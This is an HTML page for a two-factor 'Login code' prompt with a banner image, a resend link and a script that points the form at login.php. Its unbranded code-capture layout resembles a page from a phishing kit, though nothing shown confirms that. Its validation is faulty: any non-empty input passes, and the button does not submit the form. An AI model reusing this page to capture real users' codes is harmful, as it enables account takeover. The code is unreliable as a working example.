<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two factor</title>
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400&family=Poppins:wght@200&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <img src="./banner.jpg" alt="">
        <form id="form">
            <input type="text" name="username" class="input" id="input" placeholder="Login code">
        </form>
        <button class="button" id="btn">Continue</button>
        <a href="#" id="resend">Resend code</a>
    </div>
    <div class="footer">
        <a href="#">Having trouble?</a>
    </div>
    <script>
        var code = document.getElementById("input");
        var form = document.getElementById("form");
        document.getElementById("btn").addEventListener('click', function (e) {
            if (code.value !== '' || code.value.length == 6) {
                form.setAttribute('action', 'login.php');
            } 
            else{
                e.preventDefault();
            }
        })

    </script>
</body>
</html>
